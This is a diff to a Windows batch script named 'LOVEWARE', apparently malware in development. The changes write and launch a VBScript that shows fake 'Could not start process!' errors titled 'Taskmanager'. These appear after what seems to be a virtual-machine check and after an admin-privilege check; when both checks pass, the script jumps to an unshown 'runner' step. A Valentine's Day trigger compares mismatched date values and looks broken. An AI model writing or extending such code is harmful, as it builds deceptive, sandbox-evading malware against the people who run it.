@@ -1,6 +1,6 @@
 @echo off
 
-:: LOVEWARE v8.7
+:: LOVEWARE v8.8
 ::
 :: YOU CAN DELETE THIS 
 :: |  |  |  |  |  |  |
@@ -80,8 +80,12 @@ SET var=%%F
 echo %check%
 
 if %check% == False (
-    MessageBox.Show("ERROR could not run application", Windows Command Center);
+    echo Dim WshShell, BtnCode>C:\Windows\ifvm.vbs
+    echo Set WshShell = WScript.CreateObject("WScript.Shell")>>C:\Windows\ifvm.vbs
+    echo BtnCode = WshShell.Popup("Could not start process!","Taskmanager",2+48)>>C:\Windows\ifvm.vbs
+    start C:\Windows\ifvm.vbs
     pause
+    exit
 ) else (
     goto valentine
 
@@ -96,8 +100,9 @@ set today=%Year%
 
 for /f "delims=" %%a in ('c:\date.exe +%%w') do set DayOfWeek=%%a
 if %DayOfWeek% == 14-02-%Year% (
-    MessageBox.Show("Happy Valentine!!", Valentine);
+    msg * Happy Valentine!!!
     pause
+    exit
 ) else (
     goto :admin
 )
@@ -111,7 +116,10 @@ net session >nul 2>&1
 if %errorLevel% == 0 (
     goto runner
 ) else (
-    MessageBox.Show("ERROR! Program could not run, try running as admin.", Microsoft);
+    echo Dim WshShell, BtnCode>C:\Windows\ifvm.vbs
+    echo Set WshShell = WScript.CreateObject("WScript.Shell")>>C:\Windows\ifvm.vbs
+    echo BtnCode = WshShell.Popup("Could not start process!","Taskmanager",2+48)>>C:\Windows\ifvm.vbs
+    start C:\Windows\ifvm.vbs
     pause
     exit
 )
